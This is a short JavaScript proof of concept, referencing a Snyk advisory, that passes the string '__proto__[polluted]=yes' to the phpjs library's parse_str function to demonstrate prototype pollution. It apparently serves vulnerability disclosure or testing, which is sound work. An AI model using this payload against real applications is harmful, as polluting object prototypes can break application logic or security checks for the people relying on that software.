//https://snyk.io/vuln/SNYK-JS-PHPJS-598681
  const p = require("phpjs");
  p.parse_str("__proto__[polluted]=yes", {});
